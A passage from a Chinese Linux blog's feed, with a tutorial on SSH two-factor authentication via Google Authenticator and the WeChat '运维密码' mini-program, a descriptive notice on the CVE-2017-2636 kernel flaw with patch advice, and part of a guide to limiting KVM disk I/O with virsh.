    <content type="html"><![CDATA[<h1 id="通过运维密码实现Linux系统SSH双因子认证"><a href="#通过运维密码实现Linux系统SSH双因子认证" class="headerlink" title="通过运维密码实现Linux系统SSH双因子认证"></a>通过运维密码实现Linux系统SSH双因子认证</h1><h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”<a href="https://github.com/google/google-authenticator" target="_blank" rel="external">Google Authenticator</a>“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。</p>
<h2 id="前言-背景"><a href="#前言-背景" class="headerlink" title="前言/背景"></a>前言/背景</h2><p>近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。</p>
<h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><ul>
<li>什么是双因子认证</li>
</ul>
<p>双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。</p>
<ul>
<li><p>在这种多重认证的系统中，用户需要通过两种不同的认证程序：</p>
<ul>
<li><p>提供他们知道的信息（如 用户名/密码）</p>
</li>
<li><p>再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码）</p>
</li>
</ul>
</li>
</ul>
<h2 id="SSH双因子认证实现思路"><a href="#SSH双因子认证实现思路" class="headerlink" title="SSH双因子认证实现思路"></a>SSH双因子认证实现思路</h2><p>使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。</p>
<ul>
<li>关于Google 身份验证器</li>
</ul>
<p>为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器<a href="https://github.com/google/google-authenticator" target="_blank" rel="external">Google Authenticator</a>，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。</p>
<ul>
<li>关于运维密码</li>
</ul>
<p>Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。</p>
<h2 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h2><p>首先我们需要一些准备工作：</p>
<ul>
<li><p>一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机</p>
</li>
<li><p>一台能运行微信的智能手机</p>
</li>
<li><p>一台支持SSH登陆的终端</p>
</li>
</ul>
<h2 id="在-Linux-系统中安装-Google-身份验证器"><a href="#在-Linux-系统中安装-Google-身份验证器" class="headerlink" title="在 Linux 系统中安装 Google 身份验证器"></a>在 Linux 系统中安装 Google 身份验证器</h2><p>第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。</p>
<h3 id="用安装包安装-Google-身份验证器"><a href="#用安装包安装-Google-身份验证器" class="headerlink" title="用安装包安装 Google 身份验证器"></a>用安装包安装 Google 身份验证器</h3><p>如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。</p>
<ul>
<li>在 Ubuntu 上安装 Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo apt-get install libpam-google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li>在 Fedora 上安装 Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo dnf install google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li>在 CentOS 上安装 Google 身份验证器：</li>
</ul>
<p>在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo yum install google-authenticator</div></pre></td></tr></table></figure>
<h3 id="编译安装-Google-身份验证器"><a href="#编译安装-Google-身份验证器" class="headerlink" title="编译安装 Google 身份验证器"></a>编译安装 Google 身份验证器</h3><p>首先，安装构建 Google 身份验证器所需的软件包。</p>
<ul>
<li>在 Debian、 Ubuntu 或 Linux Mint 上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo apt-get install wget make gcc libpam0g-dev</div></pre></td></tr></table></figure>
<ul>
<li>在 CentOS、 Fedora 或 RHEL上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo yum install wget make gcc pam-devel</div></pre></td></tr></table></figure>
<ul>
<li>然后下载 Google 身份验证器的源代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">git clone https://github.com/google/google-authenticator.git</div></pre></td></tr></table></figure>
<ul>
<li>编译安装Google 身份验证器：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">cd google-authenticator/libpam</div><div class="line"></div><div class="line">./bootstrap.sh</div><div class="line"></div><div class="line">./configure</div><div class="line"></div><div class="line">make</div></pre></td></tr></table></figure>
<p>如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。</p>
<p>最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gamod.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sudo make install</div></pre></td></tr></table></figure>
<p>至此，Google 身份验证器安装完成。</p>
<h2 id="配置Google-身份验证器及运维密码"><a href="#配置Google-身份验证器及运维密码" class="headerlink" title="配置Google 身份验证器及运维密码"></a>配置Google 身份验证器及运维密码</h2><p>完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。</p>
<h3 id="配置google-authenticator及生成验证密钥"><a href="#配置google-authenticator及生成验证密钥" class="headerlink" title="配置google-authenticator及生成验证密钥"></a>配置google-authenticator及生成验证密钥</h3><ul>
<li>使用（以下）命令生成验证密钥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">google-authenticator</div></pre></td></tr></table></figure>
<ul>
<li><p>生成验证密钥的时候，会再次确认信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Do you want authentication tokens to be time-based (y/n)</div></pre></td></tr></table></figure>
<p>意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y</p>
</li>
</ul>
<p>输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/erweima.png" alt=""></p>
<ul>
<li><p>紧急验证码<br>在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/emergency.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>保存Google Authenticator配置文件</p>
<p>Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存：</p>
<p>意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>禁止同一令牌多用途登陆</p>
<p>意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> Do you want to disallow multiple uses of the same authentication</div><div class="line"></div><div class="line">token? This restricts you to one login about every 30s, but it increases</div><div class="line"></div><div class="line">your chances to notice or even prevent man-in-the-middle attacks (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>时间容错设置</p>
<p>意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> By default, tokens are good for 30 seconds. In order to compensate for</div><div class="line"></div><div class="line">possible time-skew between the client and the server, we allow an extra</div><div class="line"></div><div class="line">token before and after the current time. If you experience problems with</div><div class="line"></div><div class="line">poor time synchronization, you can increase the window from its default</div><div class="line"></div><div class="line">size of +-1min (window size of 3) to about +-4min (window size of</div><div class="line"></div><div class="line">17 acceptable tokens).</div><div class="line"></div><div class="line">Do you want to do so? (y/n)</div></pre></td></tr></table></figure>
<p>这个可根据实际情况进行配置。</p>
</li>
</ul>
<ul>
<li><p>暴力破解防护</p>
<p>意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> If the computer that you are logging into isn&apos;t hardened against brute-force</div><div class="line"></div><div class="line">login attempts, you can enable rate-limiting for the authentication module.</div><div class="line"></div><div class="line">By default, this limits attackers to no more than 3 login attempts every 30s.</div><div class="line"></div><div class="line">Do you want to enable rate-limiting (y/n)</div></pre></td></tr></table></figure>
<p>输入y回车</p>
</li>
</ul>
<ul>
<li><p>配置完成</p>
<p>配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示：</p>
</li>
</ul>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/configfile.png" alt=""></p>
<h3 id="配置运维密码"><a href="#配置运维密码" class="headerlink" title="配置运维密码"></a>配置运维密码</h3><ul>
<li>打开微信小程序</li>
</ul>
<p>打开微信，依次点击发现，小程序</p>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/lp.jpg" alt=""></p>
<ul>
<li><p>输入“运维密码”并搜索</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>点击“运维密码”进入应用</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>点击右下角二维码图标</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/button.png" alt=""></p>
</li>
</ul>
<ul>
<li>扫一扫配置google-authenticator时所生成的二维码</li>
</ul>
<ul>
<li><p>点击确定添加场景</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/commit.jpg" alt=""></p>
</li>
</ul>
<ul>
<li><p>添加完成</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adddone.jpg" alt=""></p>
</li>
</ul>
<h3 id="配置SSH服务"><a href="#配置SSH服务" class="headerlink" title="配置SSH服务"></a>配置SSH服务</h3><ul>
<li>添加认证模块</li>
</ul>
<p>在/etc/pam.d/sshd文件添加认证模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd</div></pre></td></tr></table></figure>
<ul>
<li>配置任何的密码认证</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<ul>
<li>重启sshd服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure>
<h2 id="测试登陆"><a href="#测试登陆" class="headerlink" title="测试登陆"></a>测试登陆</h2><p>以上配置完成基本上就搞定了，下面我们进行测试。</p>
<h3 id="登陆测试"><a href="#登陆测试" class="headerlink" title="登陆测试"></a>登陆测试</h3><ul>
<li>输入命令登陆主机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh root@10.112.2.3</div></pre></td></tr></table></figure>
<ul>
<li>首先输入服务器的密码,接着会让输入运维密码。</li>
</ul>
<p>运维密码可在小程序中查看。</p>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/onetime.jpg" alt=""></p>
<p>如下图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p>
<p>我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。</p>
<ul>
<li>公钥登陆测试</li>
</ul>
<p>如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证：</p>
<ul>
<li>首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh-copy-id root@10.112.2.3</div></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/ssh-copy-id.png" alt=""></p>
<ul>
<li>登陆测试</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p>
<p>我们可以看到，不需要输入任何密码，直接登陆到了系统。</p>
<h3 id="结合运维密码配置增强型SSH安全选项"><a href="#结合运维密码配置增强型SSH安全选项" class="headerlink" title="结合运维密码配置增强型SSH安全选项"></a>结合运维密码配置增强型SSH安全选项</h3><p>针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？</p>
<ul>
<li>配置SSH公钥双因子</li>
</ul>
<p>修改/etc/ssh/sshd_config配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<ul>
<li>重启SSH服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure>
<ul>
<li>登陆测试</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh root@10.112.2.3</div></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/pamssh.png" alt=""></p>
<p>可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。</p>
<ul>
<li><p>没有密钥的情况下尝试登陆测试,如下图</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/nopublickey.png" alt=""></p>
</li>
</ul>
<p>至此，本文结束，如有错误及不足欢迎指正。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;a href=&quot;#通过运维密码实现Linux系统SSH双因子认证&quot; class=&quot;headerlink&quot; title=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;/a&gt;通过运维密码实现Linux系统SS
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="双因子认证" scheme="http://blog.unixmen.cn/tags/%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
    
      <category term="SSH安全加固" scheme="http://blog.unixmen.cn/tags/SSH%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
      <category term="运维密码" scheme="http://blog.unixmen.cn/tags/%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权</title>
    <link href="http://blog.unixmen.cn/2017/03/20/%E6%BD%9C%E4%BC%8F7%E5%B9%B4%E7%9A%84Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9ECVE-2017-2636-%E5%8F%AF%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
    <id>http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/</id>
    <published>2017-03-20T02:00:55.000Z</published>
    <updated>2017-03-20T02:55:33.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞描述</strong><br>又一个古老的Linux内核漏洞被曝光！</p>
<p>漏洞编号：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636" target="_blank" rel="external">CVE-2017-2636</a><br>漏洞发现者：Alexander Popov<br>漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。<br>影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看<br><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8" target="_blank" rel="external">https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8</a> </p>
<p>漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。</p>
<p>Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。</p>
<p>Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。</p>
<p>“这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。”</p>
<p>因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。</p>
<p><strong>影响范围</strong></p>
<p>这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。</p>
<p>由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。</p>
<p>“漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。”</p>
<p>研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。</p>
<p>Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。</p>
<p><strong>修复建议</strong></p>
<p>该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。</p>
<p><strong>Linux各发行版本对于该漏洞相关信息</strong><br>Red Hat Enterprise Linux/CentOS<br><a href="https://access.redhat.com/security/cve/CVE-2017-2636" target="_blank" rel="external">https://access.redhat.com/security/cve/CVE-2017-2636</a></p>
<p>Debian<br><a href="https://security-tracker.debian.org/tracker/CVE-2017-2636" target="_blank" rel="external">https://security-tracker.debian.org/tracker/CVE-2017-2636</a></p>
<p>ubuntu<br><a href="https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html" target="_blank" rel="external">https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html</a></p>
<p>SUSE/openSUSE<br><a href="https://www.suse.com/security/cve/CVE-2017-2636.html" target="_blank" rel="external">https://www.suse.com/security/cve/CVE-2017-2636.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;br&gt;又一个古老的Linux内核漏洞被曝光！&lt;/p&gt;
&lt;p&gt;漏洞编号：&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636&quot; target=&quot;_b
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>KVM 实例资源限制</title>
    <link href="http://blog.unixmen.cn/2017/03/08/KVM%E5%AE%9E%E4%BE%8B%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6/"/>
    <id>http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/</id>
    <published>2017-03-08T10:32:46.000Z</published>
    <updated>2017-03-08T10:35:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。<br>以下分享如何控制实例的资源使用，对实例使用资源进行控制。</p>
<h2 id="一、磁盘资源的控制"><a href="#一、磁盘资源的控制" class="headerlink" title="一、磁盘资源的控制"></a>一、磁盘资源的控制</h2><p>对磁盘的资源限制可使用blkiotune来实现。</p>
<p>使用blkiotune对磁盘进行限制有两种方式：</p>
<ul>
<li>设置实例的权重</li>
<li>限制磁盘的IOPS</li>
</ul>
<p>命令行格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure></p>
<p>参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second</div><div class="line">--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second</div><div class="line">--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second</div><div class="line">--total-iops-sec &lt;number&gt; total I/O operations limit per second</div><div class="line">--read-iops-sec &lt;number&gt; read I/O operations limit per second</div><div class="line">--write-iops-sec &lt;number&gt; write I/O operations limit per second</div><div class="line">--config affect next boot</div><div class="line">--live affect running domain</div><div class="line">--current affect current domain</div></pre></td></tr></table></figure></p>
<h3 id="设置磁盘的权重"><a href="#设置磁盘的权重" class="headerlink" title="设置磁盘的权重"></a>设置磁盘的权重</h3><p>磁盘的权重数值范围在100-1000。</p>
<p>示例：<br>设置虚拟机的权重为700，并立即生效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkiotune 25 --weight 700 --live</div></pre></td></tr></table></figure></p>
<p>实例xml配置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;blkiotune&gt;</div><div class="line">&lt;weight&gt;700&lt;/weight&gt;</div><div class="line">&lt;/blkiotune&gt;</div></pre></td></tr></table></figure></p>
<h3 id="限制磁盘IOPS"><a href="#限制磁盘IOPS" class="headerlink" title="限制磁盘IOPS"></a>限制磁盘IOPS</h3><p>使用blkdeviotune限制读写速度和IOPS</p>
<p>示例：<br>限制读写（吞吐量）及IOPS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048  --read-iops-sec 15 --write-iops-sec 15 --live</div></pre></td></tr></table></figure></p>
<p>实例xml配置为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;iotune&gt;</div><div class="line">  &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt;</div><div class="line">  &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt;</div><div class="line">  &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt;</div><div class="line">  &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;</div><div class="line">&lt;/iotune&gt;</div></pre></td></tr></table></figure>
<h3 id="实测结果"><a href="#实测结果" class="headerlink" title="实测结果"></a>实测结果</h3><p>读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个</p>
<ul>
<li><p>列举guest块设备列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">virsh domblklist wpftest</div><div class="line">vda        /home1/wpf/ubuntu-14-04-test.qcow2</div></pre></td></tr></table></figure>
</li>
<li><p>设定guest读/写IOPS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300</div></pre></td></tr></table></figure>
</li>
<li><p>获取当前IOPS限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune wpftest vda</div><div class="line">total_bytes_sec: 0</div><div class="line">read_bytes_sec : 0</div><div class="line">write_bytes_sec: 0</div><div class="line">total_iops_sec : 0</div><div class="line">read_iops_sec  : 300</div><div class="line">write_iops_sec : 300</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="二、网卡的资源控制"><a href="#二、网卡的资源控制" class="headerlink" title="二、网卡的资源控制"></a>二、网卡的资源控制</h2><p>网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制<br>两种资源限制效果上没有区别，可按需选择。</p>
